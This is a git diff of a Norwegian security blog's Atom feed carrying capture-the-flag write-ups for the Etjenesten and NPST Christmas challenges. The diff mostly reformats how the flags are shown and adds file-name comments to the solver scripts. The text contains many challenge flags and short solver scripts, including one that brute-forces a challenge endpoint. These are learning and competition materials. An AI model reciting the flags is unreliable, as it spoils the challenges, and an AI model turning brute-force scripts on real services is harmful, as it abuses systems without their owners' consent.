@@ -1,5 +1,5 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="https://fjank.no/feed.xml" rel="self" type="application/atom+xml" /><link href="https://fjank.no/" rel="alternate" type="text/html" hreflang="en" /><updated>2021-04-11T13:27:28+02:00</updated><id>https://fjank.no/feed.xml</id><title type="html">Fjanks security pages</title><subtitle>A blog about security, CTF, vulnerabilities, pen-testing and other interesting things that are related to security. Mostly writeups from results of challenges, war-games, hacking into local vulnerable VM's and similar. I will try to make the writeups as realistic as possible by including all my wrong assumptions and failures. Also I will try to not include code complete walkthroughs, but leave the actual coding as an excercise to the reader.
-</subtitle><author><name>Frank Karlstrøm</name></author><entry><title type="html">Etjenesten CTF: Vi søker deg som vil bidra i cyberoperasjoner mot trusler i utlandet</title><link href="https://fjank.no/blog/2020-03-06-etjenesten-ctf/" rel="alternate" type="text/html" title="Etjenesten CTF: Vi søker deg som vil bidra i cyberoperasjoner mot trusler i utlandet" /><published>2020-03-06T00:00:00+01:00</published><updated>2021-04-11T12:54:30+02:00</updated><id>https://fjank.no/blog/etjenesten-ctf</id><content type="html" xml:base="https://fjank.no/blog/2020-03-06-etjenesten-ctf/">&lt;ul id=&quot;markdown-toc&quot;&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="https://fjank.no/feed.xml" rel="self" type="application/atom+xml" /><link href="https://fjank.no/" rel="alternate" type="text/html" hreflang="en" /><updated>2021-04-11T15:01:46+02:00</updated><id>https://fjank.no/feed.xml</id><title type="html">Fjanks security pages</title><subtitle>A blog about security, CTF, vulnerabilities, pen-testing and other interesting things that are related to security. Mostly writeups from results of challenges, war-games, hacking into local vulnerable VM's and similar. I will try to make the writeups as realistic as possible by including all my wrong assumptions and failures. Also I will try to not include code complete walkthroughs, but leave the actual coding as an excercise to the reader.
+</subtitle><author><name>Frank Karlstrøm</name></author><entry><title type="html">Etjenesten CTF: Vi søker deg som vil bidra i cyberoperasjoner mot trusler i utlandet</title><link href="https://fjank.no/blog/2020-03-06-etjenesten-ctf/" rel="alternate" type="text/html" title="Etjenesten CTF: Vi søker deg som vil bidra i cyberoperasjoner mot trusler i utlandet" /><published>2020-03-06T00:00:00+01:00</published><updated>2021-04-11T14:10:54+02:00</updated><id>https://fjank.no/blog/etjenesten-ctf</id><content type="html" xml:base="https://fjank.no/blog/2020-03-06-etjenesten-ctf/">&lt;ul id=&quot;markdown-toc&quot;&gt;
   &lt;li&gt;&lt;a href=&quot;#introduksjon&quot; id=&quot;markdown-toc-introduksjon&quot;&gt;Introduksjon&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;#grunnleggende&quot; id=&quot;markdown-toc-grunnleggende&quot;&gt;Grunnleggende&lt;/a&gt;    &lt;ul&gt;
       &lt;li&gt;&lt;a href=&quot;#1-hvordan-virker-det&quot; id=&quot;markdown-toc-1-hvordan-virker-det&quot;&gt;1. Hvordan virker det.&lt;/a&gt;&lt;/li&gt;
@@ -587,7 +587,7 @@ Flere gode writeups for veien videre, e.g.
 &lt;a href=&quot;https://www.indregard.no/2020/03/e-tjenestens-ctf/&quot;&gt;Sigve Indregard&lt;/a&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;til-slutt&quot;&gt;Til slutt&lt;/h2&gt;
-&lt;p&gt;🙌🙌 Takk for at du tok deg tid til å lese alt, trykk på recommend og legg inn en kommentar! 🙌🙌&lt;/p&gt;</content><author><name>Frank Karlstrøm</name></author><category term="blog" /><summary type="html">Introduksjon Introduksjon Etteretningstjenesten har en åpen vurdering av aktuelle sikkerhetsutfordringer for Norge, som ble publisert i Fokus 2020. Fokus er Etterretningstjenestens åpne vurdering av aktuelle sikkerhetsutfordringer for Norge På side 78 av denne var det et hint til en CTF konkurranse, og denne ble også reklamert for. Ved å gå til https://ctf.cybertalent.no/ så kunne man registrere seg og etterhvert delta på konkurransen. Jeg endte opp på en finfin 21. plass til slutt og lærte mye på veien. Konkurransen forgikk ved å bruke SSH for å komme seg inn på konkurranseserveren, hvor man kunne finne noen dokumenter, litt historie, og de faktiske oppgavene. Oppgavene var delt opp i Grunnleggende, Hjernetrim og Oppdrag. La oss hoppe i det!</summary></entry><entry><title type="html">NPST utlyser en midlertidig stilling som snikende alvebetjent</title><link href="https://fjank.no/blog/2020-01-04-pst-chistmas-ctf/" rel="alternate" type="text/html" title="NPST utlyser en midlertidig stilling som snikende alvebetjent" /><published>2020-01-04T00:00:00+01:00</published><updated>2021-04-11T12:54:21+02:00</updated><id>https://fjank.no/blog/pst-chistmas-ctf</id><content type="html" xml:base="https://fjank.no/blog/2020-01-04-pst-chistmas-ctf/">&lt;ul id=&quot;markdown-toc&quot;&gt;
+&lt;p&gt;🙌🙌 Takk for at du tok deg tid til å lese alt, trykk på recommend og legg inn en kommentar! 🙌🙌&lt;/p&gt;</content><author><name>Frank Karlstrøm</name></author><category term="blog" /><summary type="html">Introduksjon Introduksjon Etteretningstjenesten har en åpen vurdering av aktuelle sikkerhetsutfordringer for Norge, som ble publisert i Fokus 2020. Fokus er Etterretningstjenestens åpne vurdering av aktuelle sikkerhetsutfordringer for Norge På side 78 av denne var det et hint til en CTF konkurranse, og denne ble også reklamert for. Ved å gå til https://ctf.cybertalent.no/ så kunne man registrere seg og etterhvert delta på konkurransen. Jeg endte opp på en finfin 21. plass til slutt og lærte mye på veien. Konkurransen forgikk ved å bruke SSH for å komme seg inn på konkurranseserveren, hvor man kunne finne noen dokumenter, litt historie, og de faktiske oppgavene. Oppgavene var delt opp i Grunnleggende, Hjernetrim og Oppdrag. La oss hoppe i det!</summary></entry><entry><title type="html">NPST utlyser en midlertidig stilling som snikende alvebetjent</title><link href="https://fjank.no/blog/2020-01-04-pst-chistmas-ctf/" rel="alternate" type="text/html" title="NPST utlyser en midlertidig stilling som snikende alvebetjent" /><published>2020-01-04T00:00:00+01:00</published><updated>2021-04-11T15:01:20+02:00</updated><id>https://fjank.no/blog/pst-chistmas-ctf</id><content type="html" xml:base="https://fjank.no/blog/2020-01-04-pst-chistmas-ctf/">&lt;ul id=&quot;markdown-toc&quot;&gt;
   &lt;li&gt;&lt;a href=&quot;#introduksjon&quot; id=&quot;markdown-toc-introduksjon&quot;&gt;Introduksjon&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;#luke-1&quot; id=&quot;markdown-toc-luke-1&quot;&gt;Luke 1&lt;/a&gt;    &lt;ul&gt;
       &lt;li&gt;&lt;a href=&quot;#velkommen-til-npst-10&quot; id=&quot;markdown-toc-velkommen-til-npst-10&quot;&gt;Velkommen til NPST (10)&lt;/a&gt;&lt;/li&gt;
@@ -657,8 +657,7 @@ Hver dag kl 00:00 åpnes en ny luke og en ny oppgave. Jeg tenkte til å begynne 
 men så raskt at jeg ikke hadde nok erfaring, for det var alltid noen som hadde løst oppgavene på betydelig kortere
 tid enn meg, så jeg sluttet raskt med å løse oppgaver på natten. Jeg var fornøyd hvis jeg fikk løst alle oppgavene.&lt;/p&gt;
 
-&lt;p&gt;Python koden er kun testet at fungerer, den er ikke ryddet opp i, så den er ikke akkurat optimal. 🤪&lt;br /&gt;
-La oss hoppe i det!&lt;/p&gt;
+&lt;p&gt;Python koden er kun testet at fungerer, den er ikke ryddet opp i, så den er ikke akkurat optimal. 🤪&lt;/p&gt;
 
 &lt;h2 id=&quot;luke-1&quot;&gt;Luke 1&lt;/h2&gt;
 &lt;h3 id=&quot;velkommen-til-npst-10&quot;&gt;Velkommen til NPST (10)&lt;/h3&gt;
@@ -700,9 +699,7 @@ Du må endre passordet ditt.
 Nytt passord: 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;blockquote&gt;
-  &lt;p&gt;Flagg: PST{a7966bf58e23583c9a5a4059383ff850}&lt;/p&gt;
-&lt;/blockquote&gt;
+&lt;p class=&quot;note&quot;&gt;Flagg: PST{a7966bf58e23583c9a5a4059383ff850}&lt;/p&gt;
 
 &lt;h3 id=&quot;velg-passord-15&quot;&gt;Velg passord (15)&lt;/h3&gt;
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Gratulerer!    
@@ -721,16 +718,10 @@ Tegnene i passordet må skrives i stigende ASCII-verdi.
 Summen av ASCII-verdier modulo 128 må være lik 24.
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Et lite python program er en løsning or å finne et nytt gyldig passord, 
-Det første og beste passordet &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0@Ag&lt;/code&gt; gir oss flagg 2.&lt;/p&gt;
+&lt;p&gt;Et lite python program er en løsning or å finne et nytt gyldig passord,&lt;/p&gt;
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Passordet kunne ikke bli endret på nåværende tidspunkt.
-Prøv igjen på nyåret!
-
-PST{6a0f0731d84afa4082031e3a72354991} &amp;gt; Flagg: PST{6a0f0731d84afa4082031e3a72354991}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;string&lt;/span&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# file: &quot;findpw.py&quot;
+&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;string&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;pw&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;
 
 &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;checkGroups&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attempt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
@@ -789,6 +780,16 @@ PST{6a0f0731d84afa4082031e3a72354991} &amp;gt; Flagg: PST{6a0f0731d84afa4082031e
                 &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
+&lt;p&gt;Det første og beste passordet &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0@Ag&lt;/code&gt; gir oss flagg 2.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Passordet kunne ikke bli endret på nåværende tidspunkt.
+Prøv igjen på nyåret!
+
+PST{6a0f0731d84afa4082031e3a72354991}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p class=&quot;note&quot;&gt;Flagg: PST{6a0f0731d84afa4082031e3a72354991}&lt;/p&gt;
+
 &lt;h3 id=&quot;passordgjenoppretting-20&quot;&gt;Passordgjenoppretting (20)&lt;/h3&gt;
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;En tidligere ansatt måtte slutte etter å ha endt opp på listen over slemme barn. 
 Dessverre glemte vi å be han kopiere ut filene sine før han sluttet, og vi har følgelig ikke passordet.  
@@ -823,8 +824,7 @@ Frem til nyttår kan du nå filene dine her:
 PST{36044221cd3e991ffc56eb2f1e368ca0}
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;strong&gt;Flagg: PST{36044221cd3e991ffc56eb2f1e368ca0}&lt;/strong&gt;&lt;/p&gt;
-
+&lt;p class=&quot;note&quot;&gt;Flagg: PST{36044221cd3e991ffc56eb2f1e368ca0}&lt;/p&gt;
 &lt;p&gt;notater.jpg er et bilde av en pult med en datamaskin, en kopp, en grøtskål 
 og en gul lapp med informasjon &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IV PS ⚙️&lt;/code&gt; det skal vise seg at vi får bruk for senere.&lt;/p&gt;
 
@@ -870,8 +870,9 @@ Skriv gjerne svaret i intranettet.
 
 &lt;p&gt;Penn og papir kryptering er høyst sannsynlig en enkel krypteringsmåte, &lt;a href=&quot;https://gchq.github.io/CyberChef/&quot;&gt;cyberchef&lt;/a&gt; er mitt goto tool for exploration.
 Her viser det seg å være en veldig enkel &lt;a href=&quot;https://en.wikipedia.org/wiki/Caesar_cipher&quot;&gt;Caesar cipher&lt;/a&gt;: ROT5. 
-Cyberchef har ikke støtte for æøå, men det er raskt å manuelt ta de bokstavene som havner i det området.&lt;br /&gt;
-&lt;strong&gt;Flagg: PST{30e6d8432ce54710f9c09f305e7b9829}&lt;/strong&gt;&lt;/p&gt;
+Cyberchef har ikke støtte for æøå, men det er raskt å manuelt ta de bokstavene som havner i det området.&lt;/p&gt;
+
+&lt;p class=&quot;note&quot;&gt;Flagg: PST{30e6d8432ce54710f9c09f305e7b9829}&lt;/p&gt;
 
 &lt;h2 id=&quot;luke-4&quot;&gt;Luke 4&lt;/h2&gt;
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Ønskelister på avveie
@@ -948,10 +949,10 @@ Etter kort tid finner jeg flagget på bl.a. command &lt;code class=&quot;languag
 &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;strong&gt;Flagg: PST{ba323c3f5b3f1b536461d41cc7f1ba60}&lt;/strong&gt;&lt;/p&gt;
+&lt;p class=&quot;note&quot;&gt;Flagg: PST{ba323c3f5b3f1b536461d41cc7f1ba60}&lt;/p&gt;
 
-&lt;p&gt;Kode:&lt;/p&gt;
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# -*- coding: utf-8 -*-
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# file: &quot;brute-flag.py&quot;
+# -*- coding: utf-8 -*-
 &lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;codecs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;UTF8Writer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;codecs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getwriter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UTF8Writer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
@@ -999,10 +1000,10 @@ så kommer løsningen av seg selv: &lt;code class=&quot;language-plaintext highl
 Det var forøvring ikke mulig å løse denne til å begynne med, iom at det faktisk var en feil i hashen som var lagt ut. 
 Alikevel var det noen som hadde løst den, se en fantastisk forklaring på hvordan &lt;a href=&quot;https://github.com/myrdyr/ctf-writeups/tree/master/npst&quot;&gt;her&lt;/a&gt;.&lt;/p&gt;
 
-&lt;p&gt;&lt;strong&gt;Flagg: PST{b54daeb4ca23fea6e2c3fd7e7094ef1f}&lt;/strong&gt;&lt;/p&gt;
+&lt;p class=&quot;note&quot;&gt;Flagg: PST{b54daeb4ca23fea6e2c3fd7e7094ef1f}&lt;/p&gt;
 
-&lt;p&gt;Kode:&lt;/p&gt;
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;destriptio2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Ny pr053dyr3 f0r kryp73ring&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# file: &quot;solver.py&quot;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destriptio2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Ny pr053dyr3 f0r kryp73ring&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\
 &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;NI553N h4r få77 på p1455 ny PPK. K4n ni553n3 hj31p3r3 v3rifi53r3 4t k0d3n 3r ukn3kk31ig?'&lt;/span&gt;
 
 
@@ -1103,11 +1104,13 @@ Det er nå SANNSYNLIG at det blir en GOD JUL.
 &lt;p&gt;På juleverkstedet finner vi en sinnsvak liste av bilder. Etter litt analysering, så kan man se at det er ikke bare forskjellige
 bilder, det er en liste av ca 2340 bilder. Isteden for å lete etter det ene bildet av et flagg, så skriver jeg et program
 som henter ut alle bilder det er kun ett av. Nedlasting av bilder gjør jeg enkelt og greit med firefox, “save as”.
-Når jeg nå har en liste med 3 bilder, er det enkelt. En sko, en pingvin og ett flagg. Flagget er løsningen.&lt;br /&gt;
-&lt;strong&gt;Flagg: PST{8798e1f0a271b09750a6531686fc621b}&lt;/strong&gt;&lt;/p&gt;
+Når jeg nå har en liste med 3 bilder, er det enkelt. En sko, en pingvin og ett flagg. Flagget er løsningen.&lt;/p&gt;
+
+&lt;p class=&quot;note&quot;&gt;Flagg: PST{8798e1f0a271b09750a6531686fc621b}&lt;/p&gt;
 
 &lt;p&gt;Kode:&lt;/p&gt;
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# get the filenames
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# file: &quot;solver.py&quot;
+# get the filenames
 &lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;hashlib&lt;/span&gt;
 &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;listdir&lt;/span&gt;
 &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os.path&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;isfile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;
@@ -1136,8 +1139,9 @@ Når jeg nå har en liste med 3 bilder, er det enkelt. En sko, en pingvin og ett
 Kan du ta en ny titt og se om du finner noe muffens?
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Tjah, kan jo være den teite pingvinen? Pingviner hører jo ikke til på Nordpolen. Jupp, det var det.&lt;br /&gt;
-&lt;strong&gt;Flagg: PST{b30b4add25b97721ebf0e7ad2eb26eb9}&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Tjah, kan jo være den teite pingvinen? Pingviner hører jo ikke til på Nordpolen. Jupp, det var det.&lt;/p&gt;
+
+&lt;p class=&quot;note&quot;&gt;Flagg: PST{b30b4add25b97721ebf0e7ad2eb26eb9}&lt;/p&gt;
 
 &lt;h2 id=&quot;luke-8&quot;&gt;Luke 8&lt;/h2&gt;
 &lt;h3 id=&quot;8-desember-10&quot;&gt;8. desember (10)&lt;/h3&gt;
@@ -1162,8 +1166,9 @@ Eksempel: Julenissens verksted → PST{JULENISSENS VERKSTED}.
 &lt;p&gt;Etter en liten bomtur innom &lt;a href=&quot;https://en.wikipedia.org/wiki/Steganography&quot;&gt;steganografi&lt;/a&gt; på bildet, så er det på tide å ta en titt på 
 &lt;a href=&quot;https://www.strava.com/&quot;&gt;strava&lt;/a&gt; siden det ser ut til at julenissen bruker strava.
 Joda, både Rudolf Rødnese og Jule Nissen er på Strava, og de logger turene sine public. på den 4 desember ser det et til 
-at rudolf faktisk tok en omvei via North Pole Expedition Museum (Google Maps). Det er faktisk en isbjørn foran der…&lt;br /&gt;
-&lt;strong&gt;Flagg: PST{NORTH POLE EXPEDITION MUSEUM}&lt;/strong&gt;&lt;/p&gt;
+at rudolf faktisk tok en omvei via North Pole Expedition Museum (Google Maps). Det er faktisk en isbjørn foran der…&lt;/p&gt;
+
+&lt;p class=&quot;note&quot;&gt;Flagg: PST{NORTH POLE EXPEDITION MUSEUM}&lt;/p&gt;
 
 &lt;h3 id=&quot;spionaktivitet-15&quot;&gt;Spionaktivitet (15)&lt;/h3&gt;
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Det har kommet tips om mulig spionaktivitet utført av sørpolare agenter på 
@@ -1173,8 +1178,9 @@ Kan du identifisere en agent?
 
 &lt;p&gt;Ved å bruke strava flyby, så kan vi se enda en teit pingvin (Pen Gwyn), som var ute på tur, fulgte etter Rudolf og Nissen
 hele tiden.
-På hans profil finner vi flagget.&lt;br /&gt;
-&lt;strong&gt;PST{69d26031ea5dbbeb56f22d9647f7c98e}&lt;/strong&gt;&lt;/p&gt;
+På hans profil finner vi flagget.&lt;/p&gt;
+
+&lt;p class=&quot;note&quot;&gt;PST{69d26031ea5dbbeb56f22d9647f7c98e}&lt;/p&gt;
 
 &lt;h3 id=&quot;mystiske-profiler-20&quot;&gt;Mystiske profiler (20)&lt;/h3&gt;
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Våre analytikere mistenker at Pen Gwyn har rapportert hjem til sine kontakter på sydpolen.
@@ -1188,9 +1194,9 @@ liten katastrofe for deltakerene.
 Når jeg endelig fikk det korrekte bildet var det en annen sak.
 Alt jeg har tilgjengelig av &lt;a href=&quot;https://github.com/DominicBreuker/stego-toolkit&quot;&gt;stego-tools&lt;/a&gt; ga meg nada.
 Bakgrunnen i dette bildet har streker i forskjellig tykkelse. Med litt analyse kan man se at det er &lt;a href=&quot;https://en.wikipedia.org/wiki/Morse_code&quot;&gt;morsekode&lt;/a&gt;,
-en manuell dekoding av morse gir oss siste flagg.&lt;br /&gt;
-&lt;strong&gt;PST{e06531d19ff020a479520ef28c8d12c}&lt;/strong&gt;&lt;/p&gt;
+en manuell dekoding av morse gir oss siste flagg.&lt;/p&gt;
 
+&lt;p class=&quot;note&quot;&gt;PST{e06531d19ff020a479520ef28c8d12c}&lt;/p&gt;
 &lt;p&gt;Profil bildet til Pen Gwyn inneholder også en gul lapp med informasjon &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VII TF ⚙️&lt;/code&gt;.&lt;/p&gt;
 &lt;h2 id=&quot;luke-9&quot;&gt;Luke 9&lt;/h2&gt;
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Ønskelistelekkasje
@@ -1236,9 +1242,9 @@ biblioteket for å finne ut om de har modifisert det.&lt;/p&gt;
 Siden vi vet teksten over skal være &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PST KRØLLPARANTES&lt;/code&gt; kan vi begynne med å putte inn PST i cyberchefs vigenere decoder.
 Kjører man viegnere decoding med resultatet, får man nøkkelen.
 De tre første bokstavene er &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SPS&lt;/code&gt;, educated guess gir oss nøkkelen &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SPST&lt;/code&gt; (kan også bruteforce hvis man vil).&lt;br /&gt;
-&lt;a href=&quot;https://gchq.github.io/CyberChef/#recipe=Vigen%C3%A8re_Decode('SPST')&amp;amp;input=SEhMIERKRFdFREVTS1dDTFhLIHUwMnMxMDR5MnM2NjV0NXYzdzI2MTl2NjE4NHN1NTB0IENHR1hEQUhUSlRGTVdIIEtFTUlM&quot;&gt;Her er Cyberchef linken til løsningen&lt;/a&gt;.&lt;br /&gt;
-&lt;strong&gt;Flagg: PST{f02a104f2a665e5d3d2619d6184dc50a}&lt;/strong&gt;&lt;/p&gt;
+&lt;a href=&quot;https://gchq.github.io/CyberChef/#recipe=Vigen%C3%A8re_Decode('SPST')&amp;amp;input=SEhMIERKRFdFREVTS1dDTFhLIHUwMnMxMDR5MnM2NjV0NXYzdzI2MTl2NjE4NHN1NTB0IENHR1hEQUhUSlRGTVdIIEtFTUlM&quot;&gt;Her er Cyberchef linken til løsningen&lt;/a&gt;.&lt;/p&gt;
 
+&lt;p class=&quot;note&quot;&gt;Flagg: PST{f02a104f2a665e5d3d2619d6184dc50a}&lt;/p&gt;
 &lt;h2 id=&quot;luke-11---1337-5&quot;&gt;Luke 11 - 1337 (5)&lt;/h2&gt;
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Primære faktorer
 En av NPSTs primære oppgaver er å overvåke kommunikasjonen mellom personer 
@@ -1272,8 +1278,8 @@ riktig linebreak.&lt;/p&gt;
  █     ██    █      █  █████ ███ █   █ █████ ████  █   █ █████ █   █ █   █ █████ █   █   █████   █   █ █████ █████ █████   █    ███   ███  █████ █   █ █   █ █   █ █████ █████ █   █   █  █    
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Kode:&lt;/p&gt;
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;binStr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'0111000110011111000010010000011101000101111101111001111001111100010001000100000001011111000000011111010100000⏎
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# file: &quot;solver.py&quot;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;binStr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'0111000110011111000010010000011101000101111101111001111001111100010001000100000001011111000000011111010100000⏎
          10000000000010001001110010001000000010001000100010001011111000000010111110100100000100101001000100000100010000⏎
          00100110010100000100010100010100000010100100100000000100010000000000010001010000010000000000010001010001010001⏎
          00000001101100101001001001000000000001000100010001000010010100000010000010001000000100101010100000100010100010⏎
@@ -1330,68 +1336,69 @@ er 2019-12-11.&lt;/p&gt;
